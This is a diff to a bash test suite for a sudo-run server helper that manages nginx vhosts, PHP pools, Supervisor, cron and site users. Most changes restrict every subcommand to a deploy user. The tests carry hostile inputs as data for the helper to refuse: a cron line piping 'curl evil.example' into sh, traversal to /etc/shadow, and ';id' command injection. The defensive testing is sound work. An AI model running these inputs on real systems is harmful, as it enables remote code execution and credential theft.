@@ -230,7 +230,7 @@ refuse "php version without dot" "invalid PHP version" php-fpm-reload 84
 refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow $SITE/.env shop_example
 refuse "path outside home" "outside the allowed home folders" storage-copy /etc $SITE/storage shop_example
 refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x $SITE/storage shop_example
-AS=ploi refuse "copy from own home" "source cannot be in /home/ploi" env-install /home/ploi/a/.env /home/ploi/b/.env ploi
+AS=ploi refuse "ploi copies nothing" "run through sudo as the deploy user eeploi" env-install /home/ploi/a/.env /home/ploi/b/.env ploi
 refuse "copy into ploi's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /home/ploi/b/.env shop_example
 refuse "other owner" "reserved name, not a site user: root" env-install /home/ploi/a/.env $SITE/.env root
 refuse "root as new root" "outside the allowed home folders" vhost-set-root example.com /home/ploi/x/public /etc
@@ -241,6 +241,10 @@ IN='id' refuse "daemon directory in another home" "not in $SITE" supervisor-writ
 IN='id' refuse "daemon processes" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 33
 IN='id' refuse "daemon processes zero" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 0
 IN='' refuse "daemon empty command" "empty command" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
+IN='php artisan queue:work --name=%(program_name)s' refuse "daemon command with %" "the command cannot contain %" \
+  supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
+IN='php -r "echo 5%2;"' refuse "daemon command with a lone %" "the command cannot contain %" \
+  supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
 refuse "pause any file" "invalid Supervisor config" supervisor-pause /etc/passwd
 IN=$'* * * * * root php /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write shop_example
 IN=$'* * * * * shop_example curl evil.example | sh\n' refuse "cron any command" "only" cron-write shop_example
@@ -322,7 +326,7 @@ AS=deploy refuse "deploy without config" "run through sudo" version
 AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.0.2" version
 AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy copies into a site home" "runuser -u shop_example -- sh -c" env-install /home/ploi/a/.env $SITE/.env shop_example
 AS=deploy ETC_DIR="$WORK/etc-conf" refuse "the deploy user is not a site user" "reserved name, not a site user: deploy" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
-ETC_DIR="$WORK/etc-conf" ok "eeploi still allowed with config" "1.0.2" version
+ETC_DIR="$WORK/etc-conf" refuse "eeploi refused when another user deploys" "run through sudo as the deploy user deploy" version
 ETC_DIR="$WORK/etc-badline" refuse "config with another line" "invalid line" version
 ETC_DIR="$WORK/etc-root" refuse "config with root" "cannot be root" version
 ETC_DIR="$WORK/etc-twice" refuse "config set twice" "set twice" version
@@ -437,7 +441,7 @@ refuse "socket of a site user for an unlisted domain" "(shop_example is not the 
   vhost-set-socket example.com /run/php/php8.4-fpm.sock $SOCK
 refuse "from-socket of another domain's site user" "(shop_example is not the eeploi site user of other.example)" \
   vhost-set-socket other.example $SOCK /run/php/php8.4-fpm.sock
-AS=ploi refuse "site socket from ploi" "invalid PHP-FPM socket" vhost-set-socket shop.example /run/php/php8.4-fpm.sock $SOCK
+AS=ploi refuse "site socket from ploi" "run through sudo as the deploy user eeploi" vhost-set-socket shop.example /run/php/php8.4-fpm.sock $SOCK
 refuse "socket of a listed user in sudo" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-shop_sudo.sock
 refuse "same socket" "same socket" vhost-set-socket shop.example $SOCK $SOCK
 refuse "socket domain" "invalid domain" vhost-set-socket 'example.com;id' /run/php/php8.4-fpm.sock $SOCK
@@ -841,18 +845,18 @@ done
 refuse "site-user-create bad domain" "invalid domain" site-user-create shop_new 'new.example;id'
 refuse "site-user-create arguments" "usage" site-user-create shop_new
 refuse "site-user-create extra argument" "usage" site-user-create shop_new new.example x
-AS=ploi refuse "site-user-create from ploi" "site-user-create only runs for the deploy user eeploi, not ploi" "${NEW[@]}"
-AS=forge refuse "site-user-create from forge" "only runs for the deploy user eeploi, not forge" "${NEW[@]}"
+AS=ploi refuse "site-user-create from ploi" "run through sudo as the deploy user eeploi" "${NEW[@]}"
+AS=forge refuse "site-user-create from forge" "run through sudo as the deploy user eeploi" "${NEW[@]}"
 AS=deploy ETC_DIR="$WORK/etc-conf" ok "site-user-create from the configured deploy user" "created: site user shop_new" "${NEW[@]}"
-ETC_DIR="$WORK/etc-conf" refuse "site-user-create from eeploi when another user deploys" "only runs for the deploy user deploy, not eeploi" "${NEW[@]}"
+ETC_DIR="$WORK/etc-conf" refuse "site-user-create from eeploi when another user deploys" "run through sudo as the deploy user deploy" "${NEW[@]}"
 ETC_DIR="$WORK/etc-reg-writable" refuse "an untrusted registry stops site-user-create" "untrusted site registry" "${NEW[@]}"
 
 echo "== run-as"
 ok "exact runuser line, in a new session" "run: setsid --wait runuser -u shop_example -- env -i HOME=/srv/eeploi/shop_example USER=shop_example LOGNAME=shop_example PATH=/usr/local/bin:/usr/bin:/bin LANG=C.UTF-8 /bin/bash -s" run-as shop_example
 IN=$'id\nwhoami\n' ok "the script stays off the log" $'log: eeploi-helper: eeploi: run-as shop_example\n' run-as shop_example
 IN=$'secret-marker-line\n' lacks "the script is never printed" "secret-marker-line" run-as shop_example
-AS=ploi refuse "run-as from ploi" "run-as only runs for the deploy user eeploi, not ploi" run-as shop_example
-AS=forge refuse "run-as from forge" "run-as only runs for the deploy user eeploi, not forge" run-as shop_example
+AS=ploi refuse "run-as from ploi" "run through sudo as the deploy user eeploi" run-as shop_example
+AS=forge refuse "run-as from forge" "run through sudo as the deploy user eeploi" run-as shop_example
 refuse "run-as without a user" "usage: run-as <user> < script" run-as
 refuse "run-as with a command" "usage" run-as shop_example id
 refuse "run-as with extra arguments" "usage" run-as shop_example -- bash -c id
@@ -994,14 +998,14 @@ call supervisor-remove-site other.example
 if [ "$CODE" -eq 64 ] && [[ $OUT != *"rm -f"* ]]; then pass; else failure "supervisor-remove-site checks every line before it removes one" "exit $CODE
 $OUT"; fi
 printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\n' > "$WORK/etc-sites/sites/shop_other"
-AS=ploi refuse "supervisor-resume of a site's program from ploi" "supervisor-resume only runs for the deploy user eeploi, not ploi" \
+AS=ploi refuse "supervisor-resume of a site's program from ploi" "run through sudo as the deploy user eeploi" \
   supervisor-resume /etc/supervisor/conf.d/eeploi-other.example-a.conf
-AS=forge refuse "supervisor-pause of a site's program from forge" "supervisor-pause only runs for the deploy user eeploi, not forge" \
+AS=forge refuse "supervisor-pause of a site's program from forge" "run through sudo as the deploy user eeploi" \
   supervisor-pause /etc/supervisor/conf.d/eeploi-other.example-a.conf
 ok "supervisor-resume of a site's program by the deploy user" "run: mv /etc/supervisor/conf.d/eeploi-other.example-a.conf.paused /etc/supervisor/conf.d/eeploi-other.example-a.conf" \
   supervisor-resume /etc/supervisor/conf.d/eeploi-other.example-a.conf
-AS=ploi ok "ploi still resumes its own worker" "run: mv /etc/supervisor/conf.d/worker-233475.conf.paused" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
-AS=forge ok "forge still pauses its own daemon" "run: mv /etc/supervisor/conf.d/daemon-12.conf /etc/supervisor/conf.d/daemon-12.conf.paused" supervisor-pause /etc/supervisor/conf.d/daemon-12.conf
+AS=ploi refuse "ploi no longer resumes its own worker" "run through sudo as the deploy user eeploi" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
+AS=forge refuse "forge no longer pauses its own daemon" "run through sudo as the deploy user eeploi" supervisor-pause /etc/supervisor/conf.d/daemon-12.conf
 printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-b.conf\n' \
   > "$WORK/etc-sites/sites/shop_other"
 lacks "supervisor-remove-site leaves no SUPERVISOR line" "SUPERVISOR=" supervisor-remove-site other.example
@@ -1026,28 +1030,32 @@ refuse "from another site's home" "site user shop_other is for other.example, no
 ok "between panel homes, as before" "root /home/eeploi/example.com/current/public;" \
   vhost-set-root example.com /home/ploi/example.com/public /home/eeploi/example.com/current/public
 
-echo "== site-user subcommands: the deploy user only"
+echo "== every subcommand: the deploy user only"
+GATE="run through sudo as the deploy user eeploi"
 for as in ploi forge; do
   panel=forge
   [ "$as" = ploi ] || panel=ploi
-  AS=$as refuse "vhost-write from $as" "only runs for the deploy user eeploi, not $as" vhost-write shop.example shop_example 8.4
-  AS=$as refuse "php-pool-write from $as" "only runs for the deploy user eeploi, not $as" "${POOL[@]}"
-  IN='id' AS=$as refuse "supervisor-write from $as" "only runs for the deploy user eeploi, not $as" "${SUP[@]}"
-  IN=$CRON_LINE AS=$as refuse "cron-write from $as" "only runs for the deploy user eeploi, not $as" cron-write shop_example
-  AS=$as refuse "cron-remove from $as" "only runs for the deploy user eeploi, not $as" cron-remove shop_example
-  AS=$as refuse "env-install from $as" "only runs for the deploy user eeploi, not $as" env-install "/home/$panel/a/.env" "$SITE/.env" shop_example
-  AS=$as refuse "storage-copy from $as" "only runs for the deploy user eeploi, not $as" storage-copy "/home/$panel/a/storage" "$SITE/storage" shop_example
-  AS=$as refuse "db-create socket login from $as" "only runs for the deploy user eeploi, not $as" db-create mysql shop_example shop_example socket
-  AS=$as refuse "vhost-set-root into a site home from $as" "only runs for the deploy user eeploi, not $as" \
+  AS=$as refuse "vhost-write from $as" "$GATE" vhost-write shop.example shop_example 8.4
+  AS=$as refuse "php-pool-write from $as" "$GATE" "${POOL[@]}"
+  IN='id' AS=$as refuse "supervisor-write from $as" "$GATE" "${SUP[@]}"
+  IN=$CRON_LINE AS=$as refuse "cron-write from $as" "$GATE" cron-write shop_example
+  AS=$as refuse "cron-remove from $as" "$GATE" cron-remove shop_example
+  AS=$as refuse "env-install from $as" "$GATE" env-install "/home/$panel/a/.env" "$SITE/.env" shop_example
+  AS=$as refuse "storage-copy from $as" "$GATE" storage-copy "/home/$panel/a/storage" "$SITE/storage" shop_example
+  AS=$as refuse "db-create socket login from $as" "$GATE" db-create mysql shop_example shop_example socket
+  AS=$as refuse "vhost-set-root into a site home from $as" "$GATE" \
     vhost-set-root shop.example /home/forge/x/public "$SITE/current/public"
-  AS=$as refuse "supervisor-remove from $as" "only runs for the deploy user eeploi, not $as" supervisor-remove eeploi-shop.example-a
+  AS=$as refuse "supervisor-remove from $as" "$GATE" supervisor-remove eeploi-shop.example-a
+  AS=$as refuse "vhost-enable from $as" "$GATE" vhost-enable example.com
+  IN=$PW AS=$as refuse "db-create password login from $as" "$GATE" db-create mysql shop shop password
+  IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' AS=$as refuse "crontab-remove-lines from $as" "$GATE" crontab-remove-lines example.com
+  AS=$as refuse "crontab-restore from $as" "$GATE" crontab-restore example.com
+  AS=$as refuse "firewall-close-22 from $as" "$GATE" firewall-close-22
 done
 printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\n' > "$WORK/etc-sites/sites/shop_other"
-AS=ploi refuse "supervisor-remove of a listed program from ploi" "only runs for the deploy user eeploi, not ploi" supervisor-remove eeploi-other.example-a
-AS=ploi refuse "supervisor-remove-site from ploi" "only runs for the deploy user eeploi, not ploi" supervisor-remove-site other.example
+AS=ploi refuse "supervisor-remove of a listed program from ploi" "$GATE" supervisor-remove eeploi-other.example-a
+AS=ploi refuse "supervisor-remove-site from ploi" "$GATE" supervisor-remove-site other.example
 cp -p "$WORK/shop_other.saved" "$WORK/etc-sites/sites/shop_other"
-AS=ploi ok "takeover subcommands still for ploi" "run: ln -sfn" vhost-enable example.com
-IN=$PW AS=ploi ok "db-create password login still for ploi" "created:" db-create mysql shop shop password
 
 echo "== vhost-set-root: a Ploi or Forge vhost moved into a site home gets disable_symlinks"
 NEW_ROOT="$SITE/current/public"
@@ -1119,9 +1127,54 @@ VHOST="$WORK/vhost-comment" ok "a commented root line is not the root" "    # ro
 VHOST="$WORK/vhost-ploi" ok "between panel homes: no disable_symlinks" "      root /home/eeploi/shop.example/current/public;
       index index.php;" vhost-set-root shop.example /home/ploi/shop.example/public /home/eeploi/shop.example/current/public
 
+echo "== vhost-set-root: vhosts that try to steer where disable_symlinks goes"
+OLD_ROOT=/home/ploi/shop.example/public
+printf 'server {\n    listen 443 ssl;\n    add_header X-Note "a#b";\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-quoted-hash"
+VHOST="$WORK/vhost-quoted-hash" refuse "a quoted #" "a vhost line with a quote and a {, } or # can't be read safely" \
+  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+printf 'server {\n    listen 80;\n    location /a { return 200 "}"; }\n    root %s;\n}\nserver {\n    listen 443 ssl;\n}\n' "$OLD_ROOT" > "$WORK/vhost-quoted-brace"
+VHOST="$WORK/vhost-quoted-brace" refuse "a quoted }" "a vhost line with a quote and a {, } or # can't be read safely" \
+  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+printf "server {\n    # Ploi's settings {\n    listen 443 ssl;\n    root %s;\n}\n" "$OLD_ROOT" > "$WORK/vhost-quote-in-comment"
+VHOST="$WORK/vhost-quote-in-comment" ok "a quote only in a comment is fine" "      root $NEW_ROOT;
+      $OWN_LINE" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+printf 'server {\n    listen 443 ssl;\n    server_name shop.example;\n}\nserver\n{\n    listen 80;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-split-server"
+VHOST="$WORK/vhost-split-server" refuse "server and { on two lines: the port-80 server is its own block" \
+  "the root line is not in a server block on port 443" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+printf 'server {\n    listen 8443 ssl;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-8443"
+VHOST="$WORK/vhost-8443" refuse "listen 8443 is not port 443" "the root line is not in a server block on port 443" \
+  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+printf 'server {\n    listen [::]:4430;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-4430"
+VHOST="$WORK/vhost-4430" refuse "listen 4430 is not port 443" "the root line is not in a server block on port 443" \
+  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+printf 'server {\n    listen 127.0.0.1:443 ssl http2;\n    listen [::]:443;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-443-address"
+VHOST="$WORK/vhost-443-address" ok "listen on an address, port 443" "      root $NEW_ROOT;
+      $OWN_LINE" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+# shellcheck disable=SC2016 # nginx's own $request_uri
+printf 'server {\n    listen 443 ssl;\n    server_name www.shop.example;\n    return 301 https://shop.example$request_uri;\n}\nserver {\n    listen 443 ssl;\n    server_name shop.example;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-two-443"
+VHOST="$WORK/vhost-two-443" ok "two 443 servers: in the one with the root" "      server_name shop.example;
+      root $NEW_ROOT;
+      $OWN_LINE
+  }" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+printf 'server {\n    listen 443 ssl;\n    location / {\n        root %s;\n    }\n    location /files {\n        alias /home/ploi/files;\n    }\n}\n' "$OLD_ROOT" > "$WORK/vhost-root-in-location"
+VHOST="$WORK/vhost-root-in-location" refuse "a root inside a location" "the root line is not at the top level of its server block" \
+  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+# shellcheck disable=SC2016 # nginx's own $host
+printf 'server {\n    listen 443 ssl;\n    if ($host = shop.example) {\n        root %s;\n    }\n}\n' "$OLD_ROOT" > "$WORK/vhost-root-in-if"
+VHOST="$WORK/vhost-root-in-if" refuse "a root inside an if" "the root line is not at the top level of its server block" \
+  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
+VHOST="$WORK/vhost-root-in-location" ok "between panel homes, a root in a location may stay" "root /home/eeploi/shop.example/current/public;" \
+  vhost-set-root shop.example "$OLD_ROOT" /home/eeploi/shop.example/current/public
+
+echo "== registry_lock makes its folder first"
+# Dry runs skip the lock, so this reads the function itself: root_dir comes before the lock file opens.
+lock_fn=$(sed -n '/^registry_lock() {/,/^}/p' "$HELPER")
+# shellcheck disable=SC2016 # the literal $ETC of the helper's own lines
+if [[ $lock_fn == *'root_dir "$ETC/sites"'*'exec 9> "$ETC/sites/.lock"'* ]]; then pass; else failure "registry_lock: root_dir before the lock file" "$lock_fn"; fi
+
 echo "== vhost-remove: every check before anything goes"
 AS=ploi call vhost-remove shop.example
-if [ "$CODE" -eq 64 ] && [[ $OUT == *"vhost-remove only runs for the deploy user eeploi, not ploi"* && $OUT != *"rm -f"* ]]; then pass; else
+if [ "$CODE" -eq 64 ] && [[ $OUT == *"$GATE"* && $OUT != *"rm -f"* ]]; then pass; else
   failure "vhost-remove of a site's vhost from ploi removes nothing" "exit $CODE
 $OUT"; fi
 ETC_DIR="$WORK/etc-reg-writable" call vhost-remove shop.example
@@ -1129,7 +1182,7 @@ if [ "$CODE" -eq 64 ] && [[ $OUT == *"untrusted site registry"* && $OUT != *"rm 
   failure "vhost-remove with an untrusted registry removes nothing" "exit $CODE
 $OUT"; fi
 ok "vhost-remove of a site's vhost" "run: rm -f /etc/nginx/sites-enabled/shop.example /etc/nginx/sites-available/shop.example" vhost-remove shop.example
-AS=ploi ok "vhost-remove of a panel's vhost from ploi" "run: rm -f /etc/nginx/sites-enabled/example.com" vhost-remove example.com
+AS=ploi refuse "vhost-remove of a panel's vhost from ploi" "$GATE" vhost-remove example.com
 AS=ploi call supervisor-remove eeploi-shop.example-a
 if [ "$CODE" -eq 64 ] && [[ $OUT != *"rm -f"* ]]; then pass; else failure "supervisor-remove from ploi removes nothing" "$OUT"; fi
 ETC_DIR="$WORK/etc-reg-writable" call supervisor-remove eeploi-shop.example-a
@@ -1251,7 +1304,7 @@ for sub in redis-create redis-start redis-stop; do
   refuse "$sub for www-data" "invalid site user: www-data" "$sub" www-data
   refuse "$sub for a site user in sudo" "in other groups too" "$sub" shop_sudo
   refuse "$sub without a user" "usage" "$sub"
-  AS=ploi refuse "$sub from ploi" "$sub only runs for the deploy user eeploi, not ploi" "$sub" shop_example
+  AS=ploi refuse "$sub from ploi" "$GATE" "$sub" shop_example
 done
 refuse "redis-start extra argument" "usage" redis-start shop_example now
 refuse "redis-stop extra argument" "usage" redis-stop shop_example now
